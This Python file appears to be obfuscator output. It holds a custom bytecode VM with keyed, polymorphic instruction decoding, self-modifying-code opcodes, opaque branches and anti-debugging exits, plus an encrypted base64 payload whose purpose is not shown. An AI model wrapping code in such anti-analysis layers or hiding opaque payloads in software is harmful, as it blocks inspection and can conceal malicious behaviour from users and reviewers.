#!/usr/bin/env python3
def _gxwatyha(_bkzuq):
    return _bkzuq % 2162 + 1

import hashlib as _freytudp, hmac as _hxnyayael, base64 as _tecqcxy, sys as _emigrbkrw, zlib as _ulnblcb
_bkzuq = 569019
_beqojjt = """qST8s35oNAEPXnl6z/pOS+VT96AEuc98m+KXK7mT4v2C+9J3OYh+OkY7nzYGr7IIFvD9UCrlJQuBCHNH1NZawi2a2b0gwjqmFj8JNASdGWlNyH0KQA17FrBGOLyWQMYq7iYn3lkfAESORfH7nxU4sMoazfVJmpksyCOAfpa0hqdFGxZ1E0ssQ5ft9YEDYFnQ3spMAnK5t+OBhVe9nywGGMRZqhhim3tNrINIlHgqbJTSE9+O+jCJjmHHzr76NhyfXhyfp99VbCvuNqJCV5Zd8N2Dqaz/l8uizM2HjmQzOtlGLgwjZvxz5W7jNQqEhOcCvFCbTjCU5VpmUJeNPoGpv2CYy6jZJtPWZy/2Bp63Y/nbAariqku9/pFJvBdhH8z+7f6MAXjdU9hDODJl+joa7L0D2NdofYdxIue73+KsMZAKwz6KTsZn7NS8RWoC05Bq4V5tVg7QH+818YEKK7iXHKAzp9vnShCAdb4/ku86zj87B2EXhOHDBeFM9Cry7tS3Oxhx9emH6zt+KomHCcN7iSHNlFE2j+zGx1unYdR5BHhCsuhXqvpnY+b5rspTVuWDzp8k2IQdigPo0r3kihJGiLH1tRpynmt6sRCZoUpUlPsHu30rT1pTRstFyrZRKIC/qs6i/hclze8MQxlQyBs7R/LUdhXnFQxL+JveEz1gt16NRpiYg2abhOC7vjCRRei3Bn5O4Os8xZKZBrAfPYl84vBIxH/udPe/lKhjsiMPrALoNNn9j74ljbuBus3hOPG+Nwobi7/lLc+8O7chZBAXdPpcvEGRMYyziJNBpwceuVQQ8jD4SjcYfGANrsgBZ0cFz7vdokTA8+sWp153Cw8crC/grPHnJZ+oS2Hs5l9nHu8IJgBN9ko9UkBnQE/hQlpLyQjFHZTYUoMiOOMImYFbZcwBGCm4pYo="""
_zvlal = 3
_gkknhkbr = _gxwatyha(_bkzuq)

def _vm_decode_vl(_c, _p, _k, _m, _rm):
    _tag = _c[_p] ^ _k[_p % 32]
    _cls = (_tag >> 6) & 0x3
    if _cls == 0:
        _op = _m[_tag & 0x0F]
        _rd = _rm[(_c[_p+1] >> 4) & 0x0F] if _c[_p+1] < 64 else 0
        _rs1 = _rm[_c[_p+1] & 0x0F] if (_c[_p+1] & 0x0F) < 64 else 0
        return _op, _rd, _rs1, 0, 0, 2
    elif _cls == 1:
        _op = _m[_tag & 0x1F]
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _rd = _rm[(_b1 >> 4) & 0x0F] if ((_b1 >> 4) & 0x0F) < 64 else 0
        _rs1 = _rm[_b1 & 0x0F] if (_b1 & 0x0F) < 64 else 0
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _imm = _b2 | (_b3 << 8)
        if _imm & 0x8000:
            _imm = _imm | (-1 << 16)
        return _op, _rd, _rs1, 0, _imm, 4
    elif _cls == 2:
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
        _op = _m[_b1 & 0xFF]
        _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
        _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
        _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        return _op, _rd, _rs1, _rs2, _imm, 9
    else:
        _nb = _tag & 0x0F
        if _nb == 0:
            _nb = 1
        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
        _rs2 = _rm[(_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F] if ((_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        _ilen = 2 + _nb * 8
        return _op, _rd, _rs1, _rs2, _imm, _ilen

# Polymorphic decoder (handles variant detection)
def _vm_decode_poly(_c, _p, _k, _m, _rm):
    _tag = _c[_p] ^ _k[_p % 32]
    _cls = (_tag >> 6) & 0x3
    if _cls == 0:
        # Short class — try variants
        if _p + 2 <= len(_c) and (_p + 2 >= len(_c) or (_c[_p+2] ^ _k[(_p+2) % 32]) & 0xC0 == 0):
            # Variant 0 (standard 2B) or detect by checking if next byte looks valid
            _rd_raw = (_c[_p+1] ^ _k[(_p+1) % 32])
            _rd = _rm[(_rd_raw >> 4) & 0x0F] if (_rd_raw >> 4 & 0x0F) < 64 else 0
            _rs1 = _rm[_rd_raw & 0x0F] if (_rd_raw & 0x0F) < 64 else 0
            return _m[_tag & 0x0F], _rd, _rs1, 0, 0, 2
        if _p + 3 <= len(_c):
            # Variant 1 (3B interleaved)
            # Encoding: tag bits 3-2=rd[1:0], tag bits 1-0=op[3:2]
            #           out[1] bits 7-6=op[1:0], bits 5-2=rs1[3:0], bits 1-0=rd[4:3]
            #           out[2] bits 3-0=op[7:4]
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _op_v1 = ((_b2 & 0x0F) << 4) | ((_tag & 0x03) << 2) | ((_b1 >> 6) & 0x03)
            _rd_v1 = ((_b1 & 0x03) << 2) | ((_tag >> 2) & 0x03)
            _rs1_v1 = (_b1 >> 2) & 0x0F
            if _rd_v1 < 64:
                return _m[_op_v1 & 0xFF], _rm[_rd_v1] if _rd_v1 < 64 else 0, _rm[_rs1_v1] if _rs1_v1 < 64 else 0, 0, 0, 3
            # Variant 2 (3B scattered)
            _scat = _tag & 0x0F
            _op_lo2 = (_b1 >> 6) & 0x03
            _rd_bits = (_b1 >> 2) & 0x0F
            _rs1_hi2 = _b1 & 0x03
            _rs1_lo2 = (_b2 >> 6) & 0x03
            _scat_hi = (_b2 >> 2) & 0x0F
            _op_hi2 = _b2 & 0x30
            _op2 = ((_scat_hi << 4) | _op_hi2 | _op_lo2) & 0xFF
            _rs1_val = (_rs1_hi2 << 2) | _rs1_lo2
            if _rd_bits < 64:
                return _m[_op2], _rm[_rd_bits], _rm[_rs1_val] if _rs1_val < 64 else 0, 0, 0, 3
        # Fallback
        return _m[_tag & 0x0F], 0, 0, 0, 0, 2
    elif _cls == 1:
        # Medium class — use tag bit 5 for disambiguation
        _vbit = (_tag & 0x20) != 0
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _rd0 = (_b1 >> 4) & 0x0F
        _rs1_0 = _b1 & 0x0F
        if _p + 4 <= len(_c) and not _vbit:
            # Variant 0 (standard, bit 5 = 0)
            _op0 = _tag & 0x1F
            _imm0 = _b2 | (_b3 << 8)
            if _imm0 & 0x8000:
                _imm0 = _imm0 | (-1 << 16)
            return _m[_op0], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm0, 4
        elif _vbit and _p + 4 <= len(_c):
            # Variant 1 (imm in tag, bit 5 = 1)
            _op1 = (_b3 >> 3) & 0x1F
            _imm_lo = _tag & 0x1F
            _imm_hi = (_b2 | ((_b3 & 0x07) << 8))
            _imm1 = (_imm_hi << 5) | _imm_lo
            if _imm1 & 0x8000:
                _imm1 = _imm1 | (-1 << 16)
            return _m[_op1], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm1, 4
        # Fallback
        return 0, 0, 0, 0, 0, 2
    elif _cls == 2:
        # Long class
        _variant = (_tag >> 2) & 0x0F
        if _variant == 0 and _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        elif _variant == 1 and _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b2 & 0xFF]
            _rd = _rm[_b1 & 0x3F] if (_b1 & 0x3F) < 64 else 0
            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _rs2 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        elif _variant == 2 and _p + 10 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _rs2 = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _i0 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i1 = _c[_p+8] ^ _k[(_p+8) % 32]
            _i2 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i3 = _c[_p+6] ^ _k[(_p+6) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 10
        # Fallback
        if _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        return 0, 0, 0, 0, 0, 2
    else:
        _nb = _tag & 0x0F
        if _nb == 0:
            _nb = 1
        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
        _rs2 = _rm[(_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F] if ((_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        _ilen = 2 + _nb * 8
        return _op, _rd, _rs1, _rs2, _imm, _ilen

def _vm_run(_code, _consts, _names, _globals, _locals, _map, _op_key, _vl_flag, _poly_flag=False):
    import sys
    if sys.gettrace() is not None: sys.exit(1)
    if any(x in globals() for x in ['pdb', 'inspect', 'trace']): sys.exit(1)
    import random
    _reg_map = list(range(64))
    random.shuffle(_reg_map)
    _r = [None] * 64
    _ip = 0
    _cycle = 0
    _n = len(_code)
    _b = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
    _spill_stack = []
    _handler_stack = []
    _vm_flags = 0
    _smc_key = random.getrandbits(32)
    if _poly_flag:
        _decode = lambda: _vm_decode_poly(_code, _ip, _op_key, _map, _reg_map)
    elif _vl_flag:
        _decode = lambda: _vm_decode_vl(_code, _ip, _op_key, _map, _reg_map)
    else:
        _decode = lambda: _vm_decode_fixed(_code, _ip, _op_key, _map, _reg_map)
    _dbg_len = 0
    while _ip < _n:
        _cycle += 1
        _op, _rd, _rs1, _rs2, _imm, _ilen = _decode()
        if __debug__ and _dbg_len < 60:
            _names_dbg = ['NOP','LC','LG','SG','LF','SF','MOV','BOP','UOP','CALL']
            _on = _names_dbg[_op] if _op < len(_names_dbg) else f'OP{_op}'
            sys.stderr.write(f'  [{_ip:3d}] {_on:4s} r{_rd:2d} r{_rs1:2d} r{_rs2:2d} imm={_imm:4d} | r[{_rd}]={repr(_r[_rd])[:30]}\n')
            _dbg_len += 1
        if _op == 0:
            pass
        elif _op == 1:
            _r[_rd] = _consts[_imm]
        elif _op == 2:
            _nm = _names[_imm]
            _r[_rd] = _globals.get(_nm) if _nm in _globals else _b.get(_nm, _nm)
        elif _op == 3:
            _globals[_names[_imm]] = _r[_rd]
        elif _op == 4:
            _r[_rd] = _locals.get(_names[_imm], None)
        elif _op == 5:
            _locals[_names[_imm]] = _r[_rd]
        elif _op == 6:
            _r[_rd] = _r[_rs1]
        elif _op == 60:
            _r[_rd] = getattr(_r[_rs1], _names[_imm])
        elif _op == 61:
            _r[_rd] = __import__(_names[_imm])
        elif _op == 10:
            _r[_rd] = _r[_rs1] + _r[_rs2]
        elif _op == 11:
            _r[_rd] = _r[_rs1] - _r[_rs2]
        elif _op == 12:
            _r[_rd] = _r[_rs1] * _r[_rs2]
        elif _op == 13:
            _r[_rd] = _r[_rs1] / _r[_rs2]
        elif _op == 14:
            _r[_rd] = _r[_rs1] ** _r[_rs2]
        elif _op == 15:
            _r[_rd] = -_r[_rs1]
        elif _op == 20:
            _r[_rd] = _r[_rs1] == _r[_rs2]
        elif _op == 21:
            _r[_rd] = _r[_rs1] != _r[_rs2]
        elif _op == 22:
            _r[_rd] = _r[_rs1] < _r[_rs2]
        elif _op == 23:
            _r[_rd] = _r[_rs1] <= _r[_rs2]
        elif _op == 24:
            _r[_rd] = _r[_rs1] > _r[_rs2]
        elif _op == 25:
            _r[_rd] = _r[_rs1] >= _r[_rs2]
        elif _op == 30:
            if _vl_flag:
                _ip = _imm
            else:
                _ip = _imm * 8
            continue
        elif _op == 31:
            if _r[_rd]:
                if _vl_flag:
                    _ip = _imm
                else:
                    _ip = _imm * 8
            else:
                _ip += _ilen
            continue
        elif _op == 32:
            if not _r[_rd]:
                if _vl_flag:
                    _ip = _imm
                else:
                    _ip = _imm * 8
            else:
                _ip += _ilen
            continue
        elif _op == 33:
            _r[_rd] = _r[_rs1][_r[_rs2]]
        elif _op == 50:
            _r[_rs1][_r[_rs2]] = _r[_rd]
        elif _op == 40:
            _fn = _r[_rs1]
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_imm & 0xFFFF))
            _r[_rd] = _fn(*_args)
        elif _op == 41:
            _r[_rd] = _names[_rd](*[_r[_rs1 + _i] for _i in range(_imm & 0xFFFF)])
        elif _op == 42:
            return _r[_rd]
        elif _op == 43:
            _r[_rd] = tuple(_r[_rs1 + _i] for _i in range(_rs2))
        elif _op == 44:
            _r[_rd] = list(_r[_rs1 + _i] for _i in range(_rs2))
        elif _op == 62:
            _r[_rd] = str(_r[_rs1])
        elif _op == 63:
            _r[_rd] = ''.join(str(_r[_rs1 + _i]) for _i in range(_rs2))
        elif _op == 70:
            _r[_rd] = iter(_r[_rs1])
        elif _op == 71:
            try:
                _r[_rd] = next(_r[_rs1])
            except StopIteration:
                _ip = _imm
                continue
        elif _op == 72:
            _r[_rd].extend(_r[_rs1])
        elif _op == 75:
            _r[_rd].append(_r[_rs1])
        elif _op == 52:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if not (_v + 1 == _v): pass
                elif _imm == 1:
                    if not (_v != _v): pass
                else:
                    if not (_v - 1 == _v): pass
            except TypeError:
                pass
        elif _op == 53:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if _v * 0 != 0: pass
                elif _imm == 1:
                    if _v != _v: pass
                else:
                    if _v + 1 == _v: pass
            except TypeError:
                pass

        # ─── Indirect & Virtual Call ───
        elif _op == 80:
            _fn = _r[_rs1]
            _argc = _imm & 0xFFFF
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_argc))
            _r[_rd] = _fn(*_args)
        elif _op == 81:
            _obj = _r[_rs1]
            _vtable = _r[_rs1 + 1]
            _midx = _imm & 0xFFFF
            _argc = (_imm >> 16) & 0xFFFF
            _method = _vtable[_midx]
            _args = tuple(_r[_rs1 + 2 + _i] for _i in range(_argc))
            _r[_rd] = _method(_obj, *_args)

        # ─── Exception Handling ───
        elif _op == 90:
            _handler_stack.append({'s': _ip, 'e': _ip + _imm, 'c': None, 't': None})
        elif _op == 91:
            if _handler_stack:
                _handler_stack[-1]['t'] = _r[_rd]
                _handler_stack[-1]['c'] = _ip + _ilen
        elif _op == 92:
            _exc = _r[_rs1]
            _found = False
            for _h in reversed(_handler_stack):
                if _h['s'] <= _ip <= _h['e']:
                    if _h['t'] is None or isinstance(_exc, _h['t']):
                        _ip = _h['c']
                        _r[_rs1] = _exc
                        _found = True
                        break
            if not _found:
                raise _exc
            continue
        elif _op == 93:
            if _handler_stack:
                _handler_stack.pop()

        # ─── Obfuscated Conditional Branching ───
        elif _op == 100:
            _v = _r[_rd]
            _t1 = (_v & _v) | _v
            _t2 = (_t1 ^ 0) + 0
            _t3 = _t2 ^ _t2
            if _t3 == 0:
                if _t2:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 101:
            _v = _r[_rd]
            _t1 = _v | 0
            _t2 = _t1 & _t1
            if (_t2 ^ _t2) == 0:
                if not _t2:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 102:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _o = _r[_rd] ^ _r[_rd] if isinstance(_r[_rd], int) else 0
            if _o == 0:
                if _d == 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 103:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _m = _r[_rd] | 0 if isinstance(_r[_rd], int) else 0
            if _m == _m:
                if _d != 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 104:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _t = (_d ^ _d) & 0
            if _t == 0:
                if _d < 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 105:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _o = _r[_rs1] ^ _r[_rs1] if isinstance(_r[_rs1], int) else 0
            if _o == 0:
                if _d <= 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 106:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            if (_d * 0) == 0:
                if _d > 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 107:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _v = _r[_rd] & 0xFFFFFFFF if isinstance(_r[_rd], int) else 0
            if (_v ^ _v) == 0:
                if _d >= 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 108:
            _target = _r[_rd]
            if isinstance(_target, int) and 0 <= _target < _n:
                _ip = _target
            else:
                _ip = 0
            continue
        elif _op == 109:
            _idx = _r[_rd]
            _table_base = _imm & 0xFFFF
            _default_off = (_imm >> 16) & 0xFFFF
            _num_entries = _rs1 & 0xFF
            if isinstance(_idx, int) and 0 <= _idx < _num_entries:
                _entry_off = _table_base + _idx * 4
                if _entry_off + 4 <= _n:
                    _off = (_code[_entry_off] | (_code[_entry_off+1] << 8) | (_code[_entry_off+2] << 16) | (_code[_entry_off+3] << 24))
                    _ip += _off
                else:
                    _ip += _default_off
            else:
                _ip += _default_off
            continue

        # ─── Register Spilling ───
        elif _op == 120:
            _spill_stack.append(_r[_rd])
        elif _op == 121:
            if _spill_stack:
                _r[_rd] = _spill_stack.pop()
        elif _op == 122:
            _mask = _imm & 0xFFFF
            for _b in range(16):
                if _mask & (1 << _b):
                    _reg = _rd + _b
                    if _reg < 64 and _reg < len(_r):
                        _spill_stack.append(_r[_reg])
                        _r[_reg] = None
        elif _op == 123:
            _cnt = _imm & 0xFF
            for _ in range(min(_cnt, len(_spill_stack))):
                _spill_stack.pop()

        # ─── Self-Modifying Code ───
        elif _op == 130:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _ks = _key.to_bytes(8, 'little')
                    for _i in range(min(_plen, 8)):
                        _code[_off + _i] ^= _ks[_i % len(_ks)]
        elif _op == 131:
            _shuf = _rd & 0xFF
            _new_op = _rs1 & 0xFF
            if _shuf < 256:
                _map[_shuf] = _new_op
        elif _op == 132:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _seed = _key ^ _cycle
                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
                    for _i in range(_plen):
                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
                        _code[_off + _i] ^= (_rng >> 16) & 0xFF
        elif _op == 133:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _seed = _key ^ _cycle
                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
                    for _i in range(_plen):
                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
                        _code[_off + _i] ^= (_rng >> 16) & 0xFF

        # ─── Data Obfuscation ───
        elif _op == 140:
            _v = _r[_rs1]
            _t = (_v ^ _v) & 0
            _r[_rd] = _t | _v
        elif _op == 141:
            _v = _r[_rs1] + _r[_rs2]
            _m = _r[_rs1] ^ _r[_rs2]
            _r[_rd] = _v + _m - _m
        elif _op == 142:
            _v = _r[_rs1]
            _k = _r[_rs2]
            if isinstance(_v, int) and isinstance(_k, int):
                _r[_rd] = (_v | _k) - (_v & _k) + (_v & _k) - (_v | _k) + (_v ^ _k)
            else:
                _r[_rd] = _v

        # ─── Control Flow Integrity (opcodes 150-152) ───
        elif _op == 150:
            _exp_lo = _rd & 0xFF
            _exp_mid = _rs1 & 0xFF
            _exp_hi = _rs2 & 0xFF
            _exp_top = (_imm >> 24) & 0xFF if _imm < 0 else (_imm >> 24) & 0xFF
            _expected = _exp_lo | (_exp_mid << 8) | (_exp_hi << 16) | (_exp_top << 24)
            _csum = 0xFFFFFFFF
            _start = _ip - _ilen if _ip >= _ilen else 0
            _end = _ip + 1
            for _ci in range(_start, min(_end, len(_code))):
                _csum ^= _code[_ci]
                _csum = ((_csum << 7) | (_csum >> 25)) & 0xFFFFFFFF
                _csum ^= (_csum >> 13)
            _csum ^= 0xFFFFFFFF
            if (_csum & 0xFFFFFFFF) != (_expected & 0xFFFFFFFF):
                import sys
                sys.stderr.write('error: CFI violation detected\\n')
                sys.exit(1)
        elif _op == 151:
            import sys
            sys.stderr.write('error: integrity failure\\n')
            sys.exit(1)
        elif _op == 152:
            pass

        # ─── Constant Decryption (opcode 160) ───
        elif _op == 160:
            _r[_rd] = _consts[_imm]
            if isinstance(_r[_rd], str):
                pass

        _ip += _ilen

def _vm_decode_fixed(_c, _p, _k, _m, _rm):
    _raw = _c[_p:_p+8]
    _dec = bytes([_raw[i] ^ _k[i % 32] for i in range(len(_raw))])
    _op = _m[_dec[0]]
    _rd = _rm[_dec[1] & 0x3F] if (_dec[1] & 0x3F) < 64 else 0
    _rs1 = _rm[_dec[2] & 0x3F] if (_dec[2] & 0x3F) < 64 else 0
    _rs2 = _rm[_dec[3] & 0x3F] if (_dec[3] & 0x3F) < 64 else 0
    _imm = _dec[4] | (_dec[5] << 8) | (_dec[6] << 16) | (_dec[7] << 24)
    return _op, _rd, _rs1, _rs2, _imm, 8

def _vm_deserialize(_data):
    import struct
    _op_key = _data[:32]
    _decrypted = _data[32:]
    _map = list(_decrypted[:256])
    _pos = 256
    _flags = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _vl_flag = (_flags & 1) != 0
    _poly_flag = (_flags & 8) != 0
    _const_enc = (_flags & 2) != 0
    _cfi_flag = (_flags & 4) != 0
    
    # Read constant encryption key (16 bytes if encrypted)
    _const_key = None
    if _const_enc:
        _const_key = _decrypted[_pos:_pos+16]; _pos += 16
    
    # Skip CFI table (if present)
    if _cfi_flag:
        _cfi_nb = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        for _ in range(_cfi_nb):
            _pos += 12  # skip start(4) + len(4) + csum(4)
    
    # Constants (with optional decryption)
    _cc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _consts = []
    for _ in range(_cc):
        _t = _decrypted[_pos]; _pos += 1
        _sl = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _s = _decrypted[_pos:_pos+_sl]; _pos += _sl
        # Decrypt string constants (type 4) if encryption is enabled
        if _const_enc and _t == 4 and _const_key:
            _dec_bytes = bytearray(len(_s))
            for _j in range(len(_s)):
                _dec_bytes[_j] = _s[_j] ^ _const_key[_j % 16]
            _s = bytes(_dec_bytes)
        if _t == 0: _v = None
        elif _t == 1: _v = _s == b'1'
        elif _t == 2: _v = int(_s)
        elif _t == 3: _v = float(_s)
        elif _t == 4: _v = _s.decode('utf-8')
        elif _t == 7: _v = _s
        else: _v = _s
        _consts.append(_v)
    _nc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _names = []
    for _ in range(_nc):
        _nl = int.from_bytes(_decrypted[_pos:_pos+2], 'little'); _pos += 2
        _names.append(_decrypted[_pos:_pos+_nl].decode('utf-8')); _pos += _nl
    if _vl_flag or _poly_flag:
        _code_sz = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _code = _decrypted[_pos:_pos+_code_sz]
    else:
        _ic = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _code = _decrypted[_pos:_pos+_ic*8]
    return _code, _consts, _names, _map, _op_key, _vl_flag, _poly_flag


def _sfxdidv():
    if _emigrbkrw.gettrace() is not None:
        _emigrbkrw.stderr.write('error: debugger detected\n'); _emigrbkrw.exit(1)
